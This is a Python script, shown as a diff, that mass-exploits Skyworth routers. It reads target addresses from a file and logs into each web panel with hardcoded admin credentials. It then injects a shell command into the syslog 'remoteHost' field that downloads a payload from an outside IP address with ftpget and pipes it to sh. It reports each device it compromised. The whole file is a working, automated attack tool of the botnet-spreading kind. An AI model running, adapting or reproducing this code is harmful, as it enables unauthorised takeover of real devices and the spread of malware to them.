@@ -1,0 +1,99 @@
+import requests
+import re
+from concurrent.futures import ThreadPoolExecutor
+
+def send_post_request(ip_port):
+    url = f"http://{ip_port}/cgi-bin/index2.asp"
+
+    headers = {
+        "Host": ip_port,
+        "Content-Length": "222",
+        "Origin": f"http://{ip_port}",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+        "Connection": "close",
+    }
+
+    data = {
+        "Username": "admin",
+        "Logoff": "0",
+        "hLoginTimes": "1",
+        "hLoginTimes_Zero": "0",
+        "value_one": "1",
+        "Password1": "F20vsN%2540tL1b",
+        "Password2": "F20vsN%2540tL1b",
+        "logintype": "usr",
+        "LanIP": "192.168.1.1",
+        "Ipv6LanIP": "fe80%3A%3A1",
+        "AccessIP": ip_port.split(":")[0],
+        "Password": "F20vsN%2540tL1b",
+    }
+
+    try:
+        response = requests.post(url, headers=headers, data=data, timeout=10)
+
+        # 
+        if response.status_code == 200 and "/register.asp" in response.text:
+            # 
+            get_response = requests.get(f"http://{ip_port}/", headers={"Connection": "close"}, timeout=10)
+            session_id_match = re.search(r"SESSIONID=([^;]+)", get_response.headers.get("Set-Cookie", ""))
+            
+            if session_id_match:
+                session_id = session_id_match.group(1)
+
+                # Send the final POST request with the retrieved SESSIONID
+                post_url = f"http://{ip_port}/cgi-bin/mag-syslogmanage.asp"
+                post_headers = {
+                    "Host": ip_port,
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+                    "Connection": "close",
+                    "Cookie": f"SESSIONID={session_id}; UID=admin; PSW=F20vsN%40tL1b",
+                }
+
+                post_data = {
+                    "loglevel": "2%2C0%2C0%2C1%2C1",
+                    "loglevelchange": "1",
+                    "remoteSyslogEnableflag": "1",
+                    "tftpLogEnabledflag": "0",
+                    "tftpSaveflag": "0",
+                    "logenablechange": "0",
+                    "logenable": "No",
+                    "frameloglevel": "7",
+                    "loglevel_flag": "1",
+                    "moduleStr": "0%2C0%2C0%2C0%2C0",
+                    "clearSyslogFlag": "0",
+                    "gen_flag": "0",
+                    "up_flag": "0",
+                    "Enable": "Yes",
+                    "remoteSyslogEnable": "on",
+                    "remoteHost": "$(ftpget+45.95.146.126+-+sl|sh)",
+                    "tftpLogServer": "",
+                    "advancedSyslogEnable_flag": "0",
+                    "MainServer": "",
+                    "MainServerPort": "",
+                }
+
+                # 
+                post_response = requests.post(post_url, headers=post_headers, data=post_data, timeout=10)
+
+                # 
+                if "Log Management" in post_response.text:
+                    print(f"[SKYWORTH] exploited: {ip_port}")
+            else:
+                # 
+                pass
+        else:
+            # 
+            pass
+    except requests.RequestException as err:
+        # 
+        pass
+
+# im not silly ik
+with open("ips.txt", "r") as file:
+    ip_ports = file.read().splitlines()
+
+# fdbspy
+with ThreadPoolExecutor(max_workers=5) as executor:
+    executor.map(send_post_request, ip_ports)
